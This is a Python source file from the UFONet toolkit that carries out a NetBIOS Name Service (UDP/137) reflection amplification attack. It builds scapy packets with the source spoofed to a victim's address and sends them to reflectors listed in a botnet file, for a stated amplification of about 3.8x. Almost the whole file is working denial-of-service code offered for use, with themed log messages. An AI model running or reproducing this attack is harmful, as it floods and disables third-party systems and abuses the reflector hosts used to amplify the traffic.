#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

netbios_file = "botnet/netbios.txt"

# UFONet NetBIOS Name Service Amplification (CIPHER) - amp factor ~3.8x (UDP/137)
def cipherize(ip, rounds):
    n=0
    try:
        from core._botnet import load_botnet_file, warn_placeholders
        reflectors, _empty, _all_placeholder = load_botnet_file(netbios_file)
        if _empty:
            print("[Error] [AI] [CIPHER] botnet/netbios.txt is empty -> [Aborting!]")
            return
        if _all_placeholder:
            warn_placeholders("CIPHER", netbios_file, kind="netbios")
            return
        payload = (b'\xab\xcd\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00'
                   b'\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
                   b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00'
                   b'\x00\x21\x00\x01')
        for x in range(int(rounds)):
            n += 1
            print("[Info] [AI] [CIPHER] Decoding 'glyph' ["+str(n)+"] from the broadcast! -> [SLOWING!]")
            for r in reflectors:
                try:
                    sport = random.randint(2000, 65535)
                    packet = IP(dst=r, src=ip) / UDP(sport=sport, dport=137) / Raw(load=payload)
                    send(packet, verbose=0)
                    print("[Info] [AI] [CIPHER] Decoded 'glyph' ["+str(n)+"] IS INTERACTING WITH ["+r+"] -> [AMPLIFYING!]")
                except Exception:
                    print("[Info] [AI] [CIPHER] Decoded 'glyph' ["+str(n)+"] FAILED to reach ["+r+"] -> [PASSING!]")
    except:
        print("[Error] [AI] [CIPHER] Failing to engage... -> Is still target online? -> [Checking!]")

class NETBIOS(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] NetBIOS Amplification (CIPHER) is ready to fire: [", rounds, "glyphs ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except Exception:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                url = urlparse(target)
                a = r.resolve(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except Exception:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [CIPHER] Targeting 'localhost' -> [OK!]\n")
            return
        cipherize(ip, rounds)
